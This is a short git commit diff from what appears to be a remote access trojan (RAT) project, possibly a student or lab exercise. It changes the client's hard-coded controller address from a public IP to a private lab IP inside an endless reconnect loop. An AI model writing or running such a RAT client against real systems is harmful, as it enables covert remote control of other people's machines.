c96963ffadf6299e28dda3948702a5213a0bd276
I-Endi <endi.isuf02@gmail.com>
2022-06-17 14:39:51 +0200

    Last commit

--- src/client/client_main.py
+++ src/client/client_main.py
@@ -203,4 +203,4 @@ class Client:
 if __name__ == "__main__":
     # Run RAT with specified IP and port continuously
     while 1:
-        Client("131.155.204.207").run()
+        Client("192.168.56.102").run()
